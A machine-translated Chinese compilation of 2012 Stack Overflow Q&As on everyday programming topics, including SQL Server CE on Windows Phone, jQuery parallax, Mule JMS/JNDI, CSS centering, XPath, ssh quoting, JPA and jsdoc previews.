> 标签：windows-phone-7, sql-server-ce

[这篇 MSDN 文章](http://msdn.microsoft.com/en-us/library/windowsphone/develop/hh202860%28v=vs.92%29.aspx)介绍了如何加密和密码保护 WP7 设备上的本地 SQL Server CE 数据库。

```
MyDataContext db = new MyDataContext ("Data Source='isostore:/MyDatabase.sdf';Password='mypassword'");
if (!db.DatabaseExists()) db.CreateDatabase(); 
```

设置密码后，我无法找到如何更改密码。这可能吗？就此而言，是否可以删除创建后的密码和加密？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T05:59:30.017

不，也不可能，因为没有 ADO.NET 访问权限，通过 LINQ to SQL 访问 - 我在我的博客上进一步探讨了这个主题：http: [//erikej.blogspot.dk/2012/03/windows-phone-本地数据库-tip.html](http://erikej.blogspot.dk/2012/03/windows-phone-local-database-tip.html)

# javascript - Jquery Parallax Scrolling 效果 - 多方向

> ID：12461710
> 
> 赞同：23
> 
> 时间：2012-09-17T14:43:34.877
> 
> 标签：javascript, jquery, html, css, parallax

我需要为客户构建一个多向 JQuery 视差页面 - 他们基本上希望它以与此类似的方式工作 - [https://victoriabeckham.landrover.com/INT](https://victoriabeckham.landrover.com/INT)

我已经准备好艺术品，并找到了许多 jquery 库，它们可以让我滚动水平/垂直 - 但我不确定如何在特定坐标处将两者结合在一起。谁能指出我正确的方向？

编辑：我最初确实在查看 Superscrolarama 并认为所有问题都已解决后签署了这篇文章 - 但在实施它时遇到了困难 - 我认为它并不是我认为的救世主，我需要水平和垂直视差以及滚动到实现上述，它似乎不支持 - 所以任何其他提示我都会非常感激！

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-10-03T18:16:15.200

我把东西扔在一起对你来说是 jsfiddle。

[http://jsfiddle.net/9R4hZ/40/](http://jsfiddle.net/9R4hZ/40/)

该脚本首先初始化所有对象的起始位置。然后为箭头键和鼠标滚轮设置处理程序。之后是 parallaxScroll 函数中算法的核心。

它使用箭头或鼠标滚轮进行滚动。

有 from [left, right, top, bottom] 过渡。

HTML 和 CSS 非常简单。

运行它的 JS/jQuery 是不言自明的。

这是一个有趣的效果，似乎适合艺术类网站。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-23T14:06:42.197

Did you look into librairies like Scrollrama [http://johnpolacek.github.com/scrollorama/](http://johnpolacek.github.com/scrollorama/) or Curtain [http://curtain.victorcoulon.fr/](http://curtain.victorcoulon.fr/)?

I know in your question you mention that you already looked into different librairies but depending how they work it's difficult to really suggest how to use proper coordinates.

***edit1**

If you didn't see it yet, the auther of scrollorama also did superscrollorama which give a bit more controler over the animation for example animation when an element is pinned.

[http://johnpolacek.github.com/superscrollorama/](http://johnpolacek.github.com/superscrollorama/)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-25T07:44:55.033

[smasinghub.com](http://smashinghub.com/7-jquery-parallax-and-scrolling-effect-plugins.htm)上的这篇文章展示了一组用于滚动和视差效果的 JQuery 插件，我完全相信其中一个会对您有所帮助。看起来[jQuery Scroll Path](http://joelb.me/scrollpath/)是其中最先进的或适合您的要求。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-03T16:15:07.187

我意识到我来晚了，这似乎非常明显，但是您是否尝试过逆向工程他们在[https://victoriabeckham.landrover.com/INT](https://victoriabeckham.landrover.com/INT)上所做的事情？看起来[ScrollAnimator 脚本](https://victoriabeckham.landrover.com/js/ScrollAnimator.js?v=471)完成了大部分工作。我会下载他们的网站并在本地弄乱它，减去部分，直到我弄清楚哪些组件提供了哪些功能。然后我会通读这些内容以了解它们是如何实现的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-02T11:55:21.837

你有使用[滚动路径插件](https://github.com/JoelBesada/scrollpath)

```
make path 
```

# java - Mule-embedded：使用容器自己的 jndiInitialFactory

> ID：12461714
> 
> 赞同：2
> 
> 时间：2012-09-17T14:43:46.953
> 
> 标签：java, spring, jms, jndi, mule

考虑以下 mule 配置并将 mule 嵌入到 Web (Java EE) 应用程序中：

```
<jms:connector
        name="jmsConnector"
        connectionFactory-ref="jmsConnectionFactory"> <!-- From spring -->
        <!-- JNDI Name Resover here? -->
</jms:connector>
<flow name="mainTestFlow">
    <jms:inbound-endpoint connector-ref="jmsConnector" 
        queue="jms/MessageQueue" />
    <logger level="INFO" category="mule.message.logging" message="Message arrived." />
</flow> 
```

jmsConnectionFactory 指的是 Spring 中定义的一个 JMS Connection Factory，来自：

```
<bean id="jmsConnectionFactory" class="org.springframework.jndi.JndiObjectFactoryBean">
    <property name="jndiName" value="jms/QueueConnectionFactory" />
</bean> 
```

队列连接工厂已经过测试并且正在运行。

**jms/MessageQueue**队列名称是指在 Web 应用程序**web.xml**文件中定义的**资源引用。**此 JNDI 引用在容器级别绑定到由应用程序服务器管理并连接到适当消息传递服务器（在本例中为 ActiveMQ）的**javax.jms.Queue 。**

 ****但是，Mule 不会将**queue=""**属性视为 JNDI 目标，而是将其视为队列名称本身。因此，当上述代码初始化时，它实际上在 ActiveMQ 中创建了一个名为“jms/MessageQueue”的新队列。我真正想要的是它正确地从 Web 应用程序描述符中的 JNDI 引用中检索到队列。

好的，你可以说，我所要做的就是在 JMS 连接器上配置一个 JNDI 名称解析器，并向它添加**jndiDestinations="true"**和**forceJndiDestinations="true"**属性。

这是可以接受的：

```
<jms:default-jndi-name-resolver 
    jndiProviderUrl="tcp://localhost:1099"
    jndiInitialFactory="???"/> 
```

真正的问题是我不想将真正的 Initial Context Factory 类名放在**jndiInitialFactory**中，因为它会落入特定于容器的定义中。但是，我的应用程序有时会部署到 JBoss 4.2.3 中，有时会部署到 WebSphere 7 中。由于我们的开发过程，不能选择拥有 2 个配置和 2 个 EAR 包。

无论如何，是否有可能告诉 Mule-ESB 将当前容器（因为它处于嵌入式模式）假定为默认的 JNDI 初始工厂进行查找，或者提供一个“通用”JNDI 初始工厂来识别容器的 JNDI 环境？这应该不是问题，因为 Web 应用程序可以引用它的容器 JNDI 环境而无需额外的（甚至是可见的）配置。

如果不可能，我是否可以让我的**jms:inbound-endpoint**引用 Spring 中定义的**javax.jms.Queue**，就像**jms:connector**对 JMS Connection Factory 所做的那样？这实际上会相当优雅和干净，因为 Mule 对 Spring 友好。

谢谢大家！

* * *

***解决方案***

经过深思熟虑，我终于通过创建一个连接到 spring JNDI 工具（例如 JndiTemplate）的自定义 JndiNameResolver 解决了我的问题。这远不是最好的解决方案，但我发现这是最不会干扰和篡改 Mule 和 Spring 内部复杂性的解决方案。

也就是说，这里是类：package com.filcobra.mule；

```
import javax.naming.NamingException;

import org.mule.transport.jms.jndi.AbstractJndiNameResolver;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.jndi.JndiObjectLocator;
import org.springframework.jndi.JndiTemplate;

public class SpringJndiNameResolver extends AbstractJndiNameResolver implements InitializingBean {
    private static Logger logger = LoggerFactory.getLogger(SpringJndiNameResolver.class);
    private JndiTemplate jndiTemplate;

    @Override
    public void afterPropertiesSet() throws Exception {
        if (jndiTemplate == null) {
            jndiTemplate = new JndiTemplate();
        }
    }

    @Override
    public Object lookup(String name) throws NamingException {
        Object object = null;
        if (name != null) {
            logger.debug("Looking up name "+name);
            object = jndiTemplate.lookup(name);
            logger.debug("Object "+object+" found for name "+name);
        }
        return object;
    }

    public JndiTemplate getJndiTemplate() {
        return jndiTemplate;
    }

    public void setJndiTemplate(JndiTemplate jndiTemplate) {
        this.jndiTemplate = jndiTemplate;
    }
} 
```

这样，配置就会恢复到通常的状态：

```
<spring:bean id="jndiTemplate" class="org.springframework.jndi.JndiTemplate" />

<jms:connector
        name="jmsConnector"
        connectionFactoryJndiName="java:comp/env/jms/MyConnectionFactory" <!-- from Resource-Ref -->
        jndiDestinations="true"
        forceJndiDestinations="true"
        specification="1.1" >

    <jms:custom-jndi-name-resolver class="com.filcobra.mule.SpringJndiNameResolver">
        <spring:property name="jndiTemplate" ref="jndiTemplate"/>
    </jms:custom-jndi-name-resolver>    
</jms:connector> 
```

有了这个，我终于能够不将我的 Mule ESB 安装绑定到特定的 JMS 供应商/实现。事实上，JMS（队列和工厂）配置都由应用服务器负责。

然而，有一件事仍然很奇怪。我希望 JMS 端点也使用我的 Jndi 名称解析器来从资源引用或其 JNDI 名称中查找队列，这与使用连接工厂的方式相同。那无论如何都行不通。我最终通过放置队列名称本身来解决这个问题，就像在 JMS 服务器中创建的那样：

```
<flow name="mainTestFlow">
    <jms:inbound-endpoint connector-ref="jmsConnector" queue="queue/myQueue"/> <!-- Queue Name, not JNDI Name --> 
```

那行得通。因此，我假设 JMS 连接器不会尝试查找队列，而只是使用连接工厂（是否查找）直接访问 JMS 服务器。

问候！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T20:22:48.460

我在源代码中看到了问题：基本上，如果您提供了一个外部创建的连接工厂，`jndiDestinations`并且`forceJndiDestinations`被强制设置为`false`.

我最近对 ​​JNDI 的使用还不够多，无法为您的问题提供通用解决方案，这确实是最好的。

我会尝试子类化`org.mule.transport.jms.Jms11Support`，将我的 Spring 查找队列注入其中，在内部重新连接以使用这些队列，最后将其注入 Mule JMS 连接器本身。****

# css - 绝对中心的Jquerymobile div

> ID：12461717
> 
> 赞同：2
> 
> 时间：2012-09-17T14:43:56.657
> 
> 标签：css, jquery-mobile, positioning

我正在使用 jquerymobile，并且在 div data-role="content" 中有带有类 allertMessage 的 div。我希望这个 div 位于页面的绝对中心（垂直+水平）。我不能用这个：

```
position: absolute;
top:50%;
left:50%; 
```

因为它不会使我的元素居中。还尝试了 margin:auto 但它没有用。有什么办法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T15:01:19.957

你可以这样做：

HTML

```
<div id="alertdiv">
    <h1>This is an alert</h1>
    <p> And here is the alert content</p>
    <p>And some more content</p>
</div> 
```

CSS

```
#alertdiv{
    position:absolute;   
    background:orange;
} 
```

js

```
$(document).ready(function(){
    var toppos=($(window).height()/2) - ($("#alertdiv").height()/2);
    var leftpos=($(window).width()/2) - ($("#alertdiv").width()/2);
    $("#alertdiv").css("top", toppos).css("left",leftpos);
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:49:17.590

假设您的分割高度和宽度是 400px (both) 。然后你可以这样做：

```
#div{
   position: absolute;
   top: 50%;
   margin-top: -200px;/* half of #div height*/
   left: 50%;
   margin-left: -200px;/* half of #div width*/
} 
```

**编辑：**

好的，您也可以通过 jQuery 绝对居中。

使用这个小脚本居中：

```
jQuery.fn.center = function () {
    this.css("position","absolute");
    this.css("top", Math.max(0, (($(window).height() - this.outerHeight()) / 2) +
                                                $(window).scrollTop()) + "px");
    this.css("left", Math.max(0, (($(window).width() - this.outerWidth()) / 2) +
                                                $(window).scrollLeft()) + "px");
    return this;
} 
```

现在您可以通过添加来居中任何元素：

```
 $(element).center(); 
```

[**演示**](http://jsfiddle.net/72LPR/)

***注意：它将在每次加载时使元素居中，而不是在屏幕更改时（而且我认为您的屏幕尺寸不会改变。）***

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T15:03:23.660

使用 javascript 并像使用 jquery 一样动态定位 div，例如：

```
var WindowHeight = $(window).height(); 
```

编辑

```
$('#myDiv').css({top: ((WindowHeight - myDivHeight) / 2 ) + "px"}); 
```

类似的东西我使用它并且工作正常，没有检查我的代码可能有错字或缺少''或其他东西。我认为这是完成它的最佳方式。

对 $(window).width(); 做同样的事情

# xslt - 我可以根据变量属性在 XPath 中进行选择吗？

> ID：12461719
> 
> 赞同：5
> 
> 时间：2012-09-17T14:44:01.993
> 
> 标签：xslt, xpath, xslt-1.0, xpath-1.0

我认为这是不可能的，但希望有一个明确的答案。

XML:

```
 <agentlang>French</agentlang>
  ...
  <books>
    <book>
      <title>My Book</title>
      <author>Me</author>
    </book>
    <book>
      <title>XPath 101</title>
      <author>You</author>
  </book>
  ...
 </books>
 .....
 <translations>
    <translation English="title" French="titre" German="Titel" />
    <translation English="author" French="auteur" German="Autor" />
 </translations> 
```

然后在 XSL 中有一个主要书籍信息的简单转换，但我希望根据翻译 xml 翻译标题 - 这样的事情会起作用：

```
<xsl:value-of select="//translation[@English='title']/@French"/>
<xsl:value-of select="//translation[@English='Author']/@French"/> 
```

但我想用 XML 中的 agentlang 值替换属性 @French

我正在使用 MSXML / XSLT 1.0

有什么办法可以做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T15:00:59.573

是的，您可以使用 a`local-name()`来查找具有给定动态值的元素或属性。我已将查找值存储在[xsl:variable](http://msdn.microsoft.com/en-us/library/ms256447.aspx)中：

```
<xsl:variable name="lang" select="//agentlang/text()" />
<xsl:value-of select="//translation[@English='title']/@*[local-name()=$lang]" /> 
```

如果涉及命名空间，最好还包括对 的检查`namespace-uri()=...`，因为当然可能有两个元素具有相同的名称，但在不同的命名空间中。

**编辑**

事后看来，使用变量可能会使转换更易于阅读/维护，但不是必需的 - 这也可以直接完成：

```
<xsl:value-of select="//translation[@English='title']/@*[local-name()=//agentlang]" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-26T15:46:46.120

您可以使用模板获得相同的结果

```
<xsl:template name="translate_english_to_local">
  <xsl:param name="text>

  <xsl:value-of select="//translation[@English=$text]/@*[local-name()=//agentlang]" />

</xsl:template> 
```

这将导致：

```
<xsl:call-template="translate_english_to_local">
    <xsl:with-param name="text">title</xsl:with-param>
</xsl:call-template> 
```

*   使代码更易于阅读
*   如果您要更改翻译库，则更新模板，其余的将随之而来。

# java - 多用户基于 Web 的倒计时计时器的设计建议

> ID：12461724
> 
> 赞同：1
> 
> 时间：2012-09-17T14:44:14.533
> 
> 标签：java, python, web-applications, timer, clock

我每周帮助制作流媒体视频。我们将实时视频流式传输到达拉斯地区的多个卫星位置。为了确保所有接收位置与广播位置的时间表相同，我们使用桌面时钟/计时器应用程序和远程位置 VNC 进入该桌面以查看时钟。

我想用基于 Web 的应用程序替换当前的计时器应用程序，这样我们就可以摆脱固有的脆弱 VNC 解决方案。

以下是我的要求：

1.  始终运行的单个主时钟（无需用户登录即可继续运行时钟）
2.  任何给定观众看到的内容与主时钟上的实际时间之间的差异不能大于 1 秒。
3.  对主时钟/倒数计时器/倒数计时器所做的任何更改都需要立即被所有观众看到。

这是我的问题：我知道足够多的 java 和 python 是危险的。但我从未编写过需要像这样在服务器和客户端之间实时同步的网络应用程序。我正在寻找有关如何构建满足上述要求的 Web 应用程序的一些建议。任何可以为我指明正确方向的语言、库、文章或博客的建议将不胜感激。但有一点需要注意：如果可能，我宁愿避免使用 Java EE 或 .Net。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:54:08.160

如果它必须是 Web 应用程序，那么您可以使用[websocket](http://en.wikipedia.org/wiki/WebSocket)定期通知您的查看器服务器时间。但请注意，只有最新版本的 IE (>10.0) 才支持 websocket。

如果您有 javascript 经验（尤其是 jQuery），websocket 编程将非常容易。

```
 window.onload = function() {
     ws = new WebSocket("ws://<host>:<port>/echows");
     ws.onopen = function() {
        // do any initialization
     };
     ws.onmessage = function (evt) {
        // use evt.data;
     };
     ws.onclose = function () {
        // alert('Lost connection!');
     };
  }; 
```

在服务器端，请参阅[此 websocket 实现列表](http://en.wikipedia.org/wiki/Comparison_of_WebSocket_implementations)。我有一些使用[Tornado](http://www.tornadoweb.org/)的经验，我非常喜欢它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T15:23:39.573

*   始终运行的单个主时钟（无需用户登录即可继续运行时钟）

这并不难。

*   任何给定观众看到的内容与主时钟上的实际时间之间的差异不能大于 1 秒。

这几乎是不可能的。您可以考虑网络延迟等，但您无法确保这一点。

*   对主时钟/倒数计时器/倒数计时器所做的任何更改都需要立即被所有观众看到。

您可以使用套接字来做到这一点，或者您可以继续轮询服务器......

对“javascript ntp”进行网络搜索。有一些库可以满足您的*大部分*需求（我认为，您想要的*已经足够*了）。

大多数工作是这样的：

*   尝试计算本地时钟到主时钟的偏移量
*   不断轮询主时钟的时间，试图找出平均延迟
*   根据本地时钟与主时钟的精美数学显示时间。

几年前，我在一些基于 Flash 的聊天室工作。SWF 建立到 TwistedPython 服务器的套接字连接。这足以满足我们的需求，但我们并不关心延迟。

# ssh - 使用 ssh 转义字符

> ID：12461726
> 
> 赞同：2
> 
> 时间：2012-09-17T14:44:15.643
> 
> 标签：ssh, escaping, character

我正在尝试编写几个命令来处理 ssh 连接，但我遇到了转义字符的问题。下面是我想做的一个例子：

```
/usr/bin/ssh mrtg@172.20.29.40 echo -e "ciao\nprova" 
```

我得到了这个结果：

```
ciaonprova 
```

代替：

```
ciao
prova 
```

如果我使用`-e`ssh 选项：

```
/usr/bin/ssh -e mrtg@172.20.29.40  echo -e 'ciao\nprova' 
```

我收到此错误：

```
Bad escape character 'mrtg@172.20.29.40'. 
```

有人可以给我一个建议让远程服务器解释转义字符吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:04:17.793

该`-e`选项与您的命令无关（这些是 SSH 转义字符，而不是 shell）。

你可以把你的命令放在引号中：

```
/usr/bin/ssh mrtg@172.20.29.40 'echo -e "ciao\nprova"' 
```

# java - 使用 Java 查找天气

> ID：12461730
> 
> 赞同：8
> 
> 时间：2012-09-17T14:44:34.637
> 
> 标签：java, weather, weather-api

我想知道是否有办法使用 Java 查找特定城镇/城市的天气。我听说过 Google Weather API，但没有产生任何结果。我也听说过使用 .xml 提要来查找天气，但我在哪里可以找到呢？因此，我有两个问题，有没有办法使用 Java 查找天气，我对 .xml 是否正确？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:46:53.567

Google Weather API 似乎不再存在：

[http://thenextweb.com/google/2012/08/28/did-google-just-quietly-kill-private-weather-api/](http://thenextweb.com/google/2012/08/28/did-google-just-quietly-kill-private-weather-api/)

但是你可以使用其他的，比如

[http://www.wunderground.com/weather/api/](http://www.wunderground.com/weather/api/)

一旦你有了你的 XML（或 JSON），你就可以按照这里的描述来解析它：

[使用 Java 从 google Weather API 中提取数据](https://stackoverflow.com/questions/10487508/using-java-to-extract-data-from-google-weather-api)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-10-06T09:51:55.660

您可以为此使用 openweathermap api。转到此链接并下载 api，您还可以看到一些使用它的示例 [http://openweathermap.org/api](http://openweathermap.org/api)

# c# - 工作流设计模式

> ID：12461744
> 
> 赞同：5
> 
> 时间：2012-09-17T14:45:16.953
> 
> 标签：c#, workflow

我不认为这是[重复](https://stackoverflow.com/questions/8613905/recommend-a-design-pattern-for-a-workflow-application)的，但我实际上需要一些明智的人来确认我的问题。

我的模式也将与下图相似（尽管要复杂得多）（我的应用程序从上到下开始）。

它将一个复杂对象作为构造函数的一部分，然后经过各种进程（保存在不同的 .dll 中）。

我以前没有参与过这样的项目，并且想把它做好——我知道设计模式旨在提供帮助和指导。

![在此处输入图像描述](../Images/5ce7dc884ef7bd693dcb10b9e1fac0c3.png)

我的问题，什么模式可以工作。我被困在 .NET 2.0 上。我的研究表明序列模式。

那么，我是否仅限于序列模式，还是有人有其他建议？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T15:25:40.193

我写过类似的代码，但不仅仅是一个模式。最初我的方法是以[事务脚本模式](http://martinfowler.com/eaaCatalog/transactionScript.html)编写所有代码，然后重构。在重构期间，我遇到了以下问题；

1.  模板模式：解耦逻辑以分离类，我称之为 Activity（类似于 WF），这些 Activity 类的行为方式相似，因此使用模板模式。
2.  事务脚本模式：一个活动本身就是一个事务脚本，可以接受参数，有一个故障属性，以及在执行期间它将被使用、构造和存储的结果。
3.  Builder 模式：为了连接业务场景的所有 Acitivity 类，我最终使用了 Builder 模式。

# php - 使用 php sdk 3.2.0 从访问令牌中获取 Facebook 用户

> ID：12461746
> 
> 赞同：0
> 
> 时间：2012-09-17T14:45:22.163
> 
> 标签：php, facebook, facebook-access-token

我创建了一个 facebook 应用程序来获取用户的访问令牌，然后使用该令牌发布到用户的墙上。

问题是，在我从用户（publish_stream）获得权限后，`$fb->getUser();`即使用户已登录，也会返回 0。

如果我使用 `$fb->getAccessToken();` 它返回 App_id|secret。

问题是什么？

# java - 如何从java中的另一个类调用String或任何数据类型

> ID：12461749
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:45:40.230
> 
> 标签：java, swing, class

我有一个 LoginGUI 和一个 MainGUI，我想做的是在我的 MainGUI 中将当前用户作为字符串或 UserID 作为整数返回。我的程序运行 LoginGUI，然后如果用户名和密码与数据库匹配，它会让您进入 MainGUI。我已经在我的 LoginGUI 中声明了 CurrUserID 和 CurrUser - 两者都是公共的，但是我如何在我的 MainGUI 中使用它们？

这是我的 LoginGUI 的代码 - 我正在使用 swing。

```
 private void loginButActionPerformed(java.awt.event.ActionEvent evt) {                                         
    for (int i = 0; i <= size; i++) {
        if (login.getText().equals(users[i].getUser())) {
            currUser = users[i].getUserID();
            if (password.getText().equals(users[i].getPassword())) {
                try {
                    MainGUI main = new MainGUI(users);
                    main.setVisible(true);
                    this.dispose();
                } catch (SQLException ex) {
                    Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
            else{
                JOptionPane.showMessageDialog(null, "Incorrect Password");
            }
        }
        else{
            JOptionPane.showMessageDialog(null, "Incorrect UserName");
        }
    }
}                                        

public int getCurrUser() {
    return currUser;
} 
```

我想要做的是在我的 MainGUI 中返回 currUser。我怎样才能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:53:13.833

添加一个成员，比如说`String uid;`你的 MainGUI 类，并创建两个构造函数，一个接受`String`，另一个接受`Integer`；在他们中，设置`uuid`为通过的任何内容。现在您将把您的用户 ID 绑定到 MainGUI 以供以后使用。

因此，当您使用完 LoginGUI 后，初始化`new MainGUI(passedID)`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:54:31.933

你可以在你的`MainGUI`类中添加一个 setter 方法并像这样调用它：

```
main.setCurrentUser(currUser); 
```

为了将多个字段传递`LoginGUI`给您，`MainGUI`您可以使用包装类，例如

```
CurrUserDetails details = new CurrUserDetails(userID, userName);
main.setCurrentUserDetails(currUser); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:54:48.497

为了调用一个类的任何*非静态*方法，你需要一个类的实例，例如

```
public class Foo{
    public void bar(){
        // do stuff
    }
}

Foo f = new Foo();
f.bar(); // invoking non-static method of class Foo 
```

# sql - 什么更有效，in 子句或 or 子句，索引是否仍然被使用？

> ID：12461750
> 
> 赞同：1
> 
> 时间：2012-09-17T14:45:44.660
> 
> 标签：sql, openedge

假设我有一个`customers`包含 an`account_number`和 a的表`billing_account_number`，如果我链接到另一个需要测试的表，我可以使用以下 or 子句：

```
select c.name
  from customers c
 ,left join credit_terms ct on account = c.account_number
                            or account = c.billing_account 
```

但是，我发现以下工作同样有效

```
select c.name
  from customers c
 ,left join credit_terms ct on account in (c.account_number, c.billing_account) 
```

现在假设它`credit_terms.account`已被索引，那么该索引会在两种情况下都使用吗？两个陈述是否相同？是否有任何与其中一项相关的费用？

尽管我对中等级别的 SQL 相当陌生，但我为自己的天真道歉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T12:34:01.400

OpenEdge 使用基于成本的优化器，因此特定的查询计划将受到与查询相关的统计信息的影响——它可能会或可能不会使用您期望的索引，具体取决于优化器对数据的了解。

这篇知识库文章解释了 OpenEdge 的 SQL 查询计划：

[http://progresscustomersupport-survey.force.com/ProgressKB/articles/Article/P62658?retURL=%2Fapex%2FProgressKBHome&popup=false](http://progresscustomersupport-survey.force.com/ProgressKB/articles/Article/P62658?retURL=%2Fapex%2FProgressKBHome&popup=false)

您还必须定期更新 SQL 统计信息以使优化器做好工作：

[http://progresscustomersupport-survey.force.com/ProgressKB/articles/Article/20992?retURL=%2Fapex%2Fprogresskbsearch&popup=false](http://progresscustomersupport-survey.force.com/ProgressKB/articles/Article/20992?retURL=%2Fapex%2Fprogresskbsearch&popup=false)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:52:31.093

我对opengge一无所知，但我认为任何一个都不会使用索引。其中2个基本相同。

如果您想使用索引，我会这样做：

```
select c.name
  from customers c
  left join credit_terms ct on ct.account = c.account_number
union
select c.name
  from customers c
  left join credit_terms ct on ct.account = c.billing_account 
```

再说一次，这在某种程度上是推测，正如我再说一遍，我对opengge一无所知。

# spring - JPA @公式和集合

> ID：12461751
> 
> 赞同：4
> 
> 时间：2012-09-17T14:45:46.417
> 
> 标签：spring, hibernate, collections, formula

```
@Entity
@Table(name = "Person")
public class Person {

    @Id 
    private Long id;

    private String firstName;

    private String lastName;

    @ManyToOne(fetch = FetchType.LAZY, cascade = CascadeType.ALL)
    @JoinColumn(name="address_id", referencedColumnName="id")
    private Address address;

    @ManyToOne(fetch = FetchType.LAZY, cascade = CascadeType.ALL)   
    @JoinColumn(name="mother", referencedColumnName="id")
    private Person mother;

    @ManyToOne(fetch = FetchType.LAZY, cascade = CascadeType.ALL)
    @JoinColumn(name="father", referencedColumnName="id")
    private Person father;

    @OneToMany(fetch = FetchType.LAZY, cascade = CascadeType.ALL)
    @Formula(value="(SELECT DISTINCT FROM PERSON as p WHERE p.father=id OR p.mother=id)")
    private Collection<Person> children;

    //...
} 
```

问候 Stackoverflow 的人们！

我刚开始使用 Spring 和 JPA。

基本上，您可以看到一个名为 Person 的实体，我在其中定义了以下属性，例如 id、firstName、secondName、person 的父亲、person 的母亲和 person 的孩子。没有在帖子中添加 getter/setter。

我的第一个问题是，是否可以使用公式来创建数据集合？在某处我听说这是不可能的，而且 Internet 基本上没有所需规格的数据，这就是我创建这个主题的原因。

第二个问题，如果不可能，那么在没有公式的情况下描述以下情况的最佳方法是什么？问题在于将孩子与母亲/父亲的价值观联系起来。基本上最终结果应该是 JPA 进行数据绑定。

# google-apps-script - 如何在 google doc 脚本中预览 jsdoc 注释

> ID：12461752
> 
> 赞同：7
> 
> 时间：2012-09-17T14:45:53.413
> 
> 标签：google-apps-script, google-sheets, preview, jsdoc

我知道已提出问题 1731，要求在 Google 脚本编辑器中预览 jsdoc。[http://code.google.com/p/google-apps-script-issues/issues/detail?id=1731](http://code.google.com/p/google-apps-script-issues/issues/detail?id=1731)

当我们等待实现它时，预览我添加到已发布库中的 jsdoc 注释的最佳方式是什么，而不需要我创建新版本？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-20T15:42:20.250

2014 年更新：Google Apps 脚本编辑器的自动完成功能现在支持库，因此可以立即获得有关库的一些 jsdoc 注释的反馈。

* * *

这个解决方案并不理想——它没有提供与已发布的谷歌脚本库相同的外观——但至少我可以通过我的 jsdoc 注释来很好地了解它们的外观，而无需不断创建我的新版本没有功能增强的库。*如果有人可以详细说明其他步骤以获得我们从发布中看到的确切输出，请分享！*

这就是我在 Windows 7 PC 上所做的。类似的步骤可能适用于其他平台，ymmv。

*   通过将存储库下载为[zipfile](https://github.com/jsdoc3/jsdoc/zipball/master)来获取 jsdoc3 。

*   解压到方便的位置。我用过`C:\jsdoc`。这也安装了 jsdoc3 所需的 Rhino jvm。

接下来，您需要将您的 google 脚本放入可以被 jsdoc3 解析的本地文件中。*再说一次，如果有人知道更好的方法，我全神贯注！*

*   为您的 google 脚本项目设置本地目录。`C:\myscript`， 说。

*   转到您在 google docs/drive/whatever 中的脚本，然后将整个内容复制到系统剪贴板。

    ```
    <ctrl-A> <ctrl-C> 
    ```

*   使用您喜欢的文本编辑器，粘贴剪贴板内容

    ```
    <ctrl-V> 
    ```

*   将结果保存在 javascript 文件中。`C:\myscript\testing.js`， 说。

好的，从这里开始解析文件、审核输出并编辑您的 jsdoc 注释，直到您对它们满意为止。

jsdoc3 的输出将进入“out”目录。

*   在 中打开命令窗口`C:\myscript`。

*   解析您的 javascript 文件。

    ```
    \jsdoc\jsdoc testing.js 
    ```

*   在默认浏览器中打开输出。

    ```
    out\index.html 
    ```

*   冲洗并重复，直到你得到你想要的结果。

*   将您编辑的脚本复制并粘贴回 Google 空间，验证您的代码没有损坏，然后制作一个新版本来为您发布的库生成文档。

## 注意事项：

*   输出的格式与您在已发布的 Google 脚本库中看到的不同，但内容大致相同。请记住，Google 仅支持一部分 jsdoc 标记（仅限 @param 和 @returns）——您可以将其他标记放入您的代码中，但它们将被忽略。

*   HTML 表格可以包含在您的 jsdoc 注释中，但自定义选项有限。

    *   您必须将所有行包含在`<tbody></tbody>`标签中；内的行`<thead>`被忽略。
    *   进一步 - 都`<th>`被忽略了。要使第一行脱颖而出，请使用`<b></b>`标签。
    *   不要打扰任何单元格格式`align`等将被忽略。
    *   您可以在样式属性中指定宽度，并且它仍然存在。

## 例子：

下面是在 jsdoc 和 googlescript doc 中呈现的一些元素的示例：

```
/**
 * Demonstrate jsdoc with a table. Otherwise, meaningless gibberish.
 *
 * <table> 
 * <tbody>
 * <tr><td style="width: 75%"><b>Student Name</b></td><td style="width: 25%"><b>Idiocy Factor</b></td></tr>
 * <tr><td> John Smith      </td><td align=right>  18 </td></tr>
 * <tr><td> Sally Doe       </td><td align=right>  53 </td></tr>
 * <tr><td> Carmen Sandiego </td><td align=right>  90 </td></tr>
 * <tr><td> Tam O'Shanter   </td><td align=right> 180 </td></tr>
 * </tbody>
 * </table>
 *
 * Continuation of function description down here. Why not have an example?
 * <pre>
 * =myFunc($A8, $DV8 )
 * </pre>
 *
 * @param {String} your mother's name, e.g. <code>"Anne Murray"</code>
 * @param {String} date of birth, <code>DD/MM/YYYY</code>
 * @returns {Date} estimated date of demise
 * @returns {String} "Please try again." if error in input
 */ 
```

